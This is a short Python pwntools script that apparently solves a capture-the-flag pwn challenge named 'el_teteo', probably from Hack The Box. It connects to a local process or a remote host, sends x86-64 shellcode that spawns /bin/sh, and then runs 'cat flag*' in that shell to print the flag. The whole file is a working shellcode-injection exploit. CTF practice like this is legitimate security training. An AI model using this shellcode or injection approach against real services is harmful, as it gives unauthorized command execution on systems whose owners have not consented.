#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './el_teteo' 

LOCAL = False # CHANGE THIS TO True if you want to run it locally

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Shellcode from https://shell-storm.org/shellcode/files/shellcode-806.html
sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" 

# Send shellcode
r.sendlineafter('>', sc)

# Get flag
pause(1)
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
